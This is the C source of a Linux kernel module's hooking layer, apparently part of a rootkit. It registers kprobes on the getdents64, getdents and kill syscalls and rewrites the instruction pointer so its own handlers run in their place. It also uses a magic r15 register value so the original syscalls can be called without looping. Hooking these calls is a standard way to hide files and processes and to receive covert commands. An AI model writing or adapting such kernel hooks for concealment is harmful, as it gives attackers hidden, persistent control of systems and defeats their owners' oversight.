#include "inc/hook.h"
#include "inc/util.h"

#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/syscalls.h>

struct hook {
  syscall_t *func;  // hook function
  struct kprobe kp; // kprobe hook
};

struct hook hooks[] = {
    {.func = h_getdents64, .kp = {.symbol_name = "__x64_sys_getdents64"}},
    {.func = h_getdents, .kp = {.symbol_name = "__x64_sys_getdents"}},
    {.func = h_kill, .kp = {.symbol_name = "__x64_sys_kill"}},
    /*{.num = __NR_openat, .name = "openat", .func = h_openat},
    {.num = __NR_statx, .name = "statx", .func = h_statx},
    {.num = __NR_chdir, .name = "chdir", .func = h_chdir},
    {.num = __NR_write, .name = "write", .func = h_write},
    {.num = __NR_read, .name = "read", .func = h_read},
    {.num = __NR_open, .name = "open", .func = h_openat},
    {.num = __NR_kill, .name = "kill", .func = h_kill},*/
};

#define hook_count() (sizeof(hooks) / sizeof(hooks[0]))

int __hook_pre_handler(struct kprobe *kp, struct pt_regs *r) {
  uint8_t i = 0;

  // clang-format off

  /*

   * here is the problem: if we hook a syscall and call our hook function instead,
   * when the hook function calls the original syscall function, the kprobe will
   * be triggered again, so we will trigger our hook again, which will trigger the
   * kprobe again... so an infinite loop, we will just hang the current task

   * to prevent this, the hooked function sets the r15 register to a special value
   * which is used verify that the caller is actually our hook function, see hooks_orig_call()

   * in this case we'll just singlestep the original syscall, preventing the loop

  */

  // clang-format on

  if (r->r15 == SHRK_MAGIC_R15)
    return 0;

  for (; i < hook_count(); i++) {
    if (kp == &hooks[i].kp) {

      // clang-format off

      /*

       * redirect execution to the hooked call (by modifying the instruction pointer)
       * see Documentation/trace/kprobes.rst for more info

       * Changing Execution Path
       * -----------------------
       * ...
       * If you change the instruction pointer (and set up other related registers) in pre_handler,
       * you must return !0 so that kprobes stops single stepping and just returns to the given address.
       * This also means post_handler should not be called anymore.

      */

      // clang-format on

      r->ip = (uint64_t)hooks[i].func;
      return 1;
    }
  }

  return 0;
}

bool hooks_install(void) {
  struct hook *h = NULL;
  uint8_t i = 0;

  // register all the hooks
  for (; i < hook_count(); i++) {
    h = &hooks[i];
    h->kp.pre_handler = __hook_pre_handler;

    if (register_kprobe(&h->kp) != 0) {
      debgf("failed to register kprobe for %s", h->kp.symbol_name);
      continue;
    }

    debgf("hooked %s (0x%px => 0x%px)", h->kp.symbol_name, h->kp.addr, h->func);
  }

  return true;
}

void hooks_uninstall(void) {
  uint8_t i = 0;

  for (; i < hook_count(); i++)
    unregister_kprobe(&hooks[i].kp);
}

int64_t hooks_orig_call(syscall_t *orig, const struct pt_regs *r) {
  int64_t ret = 0;

  if (NULL == orig || NULL == r)
    return -ENOSYS; // this gaslighting aint gonna work :skull:

  // clang-format off

  /*

   * we could just mov $SHRK_MAGIC_R15 %r15 and return orig(r)
   * and call it a day but compiler may modify r15 after the asm call
   * so just to make sure the r15 is %100 set we'll do the call in asm
   * as well

   * also at&t syntax is cringe (thats why ken came up with c)

  */

  // clang-format on

  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "call *%3;"
      "mov %%rax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "rm"(r), "m"(orig)
      : "%r15", "%rdi", "%rax");

  return ret;
}

void *hooks_orig_find(const char *symbol) {
  uint8_t i = 0;

  for (; i < hook_count(); i++) {
    if (strcmp(hooks[i].kp.symbol_name, symbol) == 0)
      return hooks[i].kp.addr;
  }

  debg("we are sooo fucked");
  return NULL;
}
